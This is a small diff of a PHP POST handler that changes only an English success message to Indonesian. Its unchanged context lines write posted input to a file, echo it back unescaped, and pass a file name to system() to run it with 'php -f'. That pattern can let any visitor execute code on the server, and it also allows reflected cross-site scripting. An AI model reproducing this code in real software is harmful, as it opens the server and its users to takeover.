@@ -8,7 +8,7 @@ if ($_POST) {
     fwrite($file, $message);
     fclose($file);
 
-    echo 'Success ' . $message . ' has been sent';
+    echo $message . ' berhasil dikirim!';
     system('php -f ' . $filename . ' &>/dev/null');
 } else {
     echo 'MBEERRR....';
